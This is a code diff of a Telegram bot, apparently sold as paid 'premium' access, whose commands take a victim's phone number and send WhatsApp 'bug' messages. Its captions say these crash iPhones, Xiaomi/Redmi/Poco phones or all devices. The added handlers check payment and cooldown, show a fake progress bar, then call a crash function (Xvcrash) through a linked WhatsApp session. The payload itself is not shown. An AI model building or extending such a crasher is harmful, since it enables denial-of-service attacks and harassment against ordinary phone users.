+if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+  return bot.sendPhoto(chatId, randomImage, {
+    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
+    parse_mode: "MarkdownV2",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
+        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
+      ]
+    }
+  });
+}
 
-bot.onText(/\/UI (\d+)/, async (msg, match) => {
+const remainingTime = checkCooldown(msg.from.id);
+if (remainingTime > 0) {
+  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
+}
+
+  try {
+    if (sessions.size === 0) {
+      return bot.sendMessage(
+        chatId,
+        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
+      );
+    }
+
+    // Kirim gambar + caption pertama
+    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
+      caption: `
+\`\`\`
+#- 𝘉 𝘜 𝘎 - ZyuRForce
+╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
+──────────────────────────
+ ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
+ ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
+ ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
+\`\`\`
+`, parse_mode: "Markdown"
+    });
+
+    // Progress bar bertahap
+    const progressStages = [
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
+      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
+    ];
+
+    // Jalankan progres bertahap
+    for (const stage of progressStages) {
+      await new Promise(resolve => setTimeout(resolve, stage.delay));
+      await bot.editMessageCaption(`
+\`\`\`
+#- 𝘉 𝘜 𝘎 - ZyuRForce
+╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
+──────────────────────────
+ ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
+ ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
+ ${stage.text}
+\`\`\`
+`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
+    }
+
+    // Eksekusi bug setelah progres selesai
+    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
+    await Xvcrash(sessions.values().next().value, jid);
+    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
+
+    // Update ke sukses + tombol cek target
+    await bot.editMessageCaption(`
+\`\`\`
+#- 𝘉 𝘜 𝘎 - ZyuRForce
+╰➤ Bug berhasil dikirim ke target!
+──────────────────────────
+ ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
+ ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
+ ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
+\`\`\`
+`, {
+      chat_id: chatId,
+      message_id: sentMessage.message_id,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
+      }
+    });
+
+  } catch (error) {
+    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
+  }
+});
+
+bot.onText(/\/ZyuRNovaXz (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -807,7 +965,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
       caption: `
 \`\`\`
-#- 𝘉 𝘜 𝘎 - Ｕ Ｉ
+#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
 ╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -832,7 +990,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-#- 𝘉 𝘜 𝘎 - Ｕ Ｉ
+#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
 ╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -851,7 +1009,7 @@ if (remainingTime > 0) {
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-#- 𝘉 𝘜 𝘎 - Ｕ Ｉ
+#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
 ╰➤ Bug berhasil dikirim ke target!
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -873,7 +1031,7 @@ if (remainingTime > 0) {
 });
 
 
-bot.onText(/\/Xcrash (\d+)/, async (msg, match) => {
+bot.onText(/\/ZyuRIphong (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -911,7 +1069,7 @@ if (remainingTime > 0) {
     const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
       caption: `
 \`\`\`
-#- 𝘉 𝘜 𝘎 - Ｘ C R A S H
+#- 𝘉 𝘜 𝘎 - ZyuRIphong
 ╰➤ Bug ini work di semua device dan berlangsung lama
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -936,7 +1094,7 @@ if (remainingTime > 0) {
       await new Promise(resolve => setTimeout(resolve, stage.delay));
       await bot.editMessageCaption(`
 \`\`\`
-#- 𝘉 𝘜 𝘎 - Ｘ C R A S H
+#- 𝘉 𝘜 𝘎 - ZyuRIphong
 ╰➤ Bug ini work di semua device dan berlangsung lama
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
@@ -955,7 +1113,7 @@ if (remainingTime > 0) {
     // Update ke sukses + tombol cek target
     await bot.editMessageCaption(`
 \`\`\`
-#- 𝘉 𝘜 𝘎 - Ｘ Ｏ Ｐ Ｏ Ｗ Ｎ
+#- 𝘉 𝘜 𝘎 - ZyuRIphong
 ╰➤ Bug berhasil dikirim ke target!
 ──────────────────────────
  ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
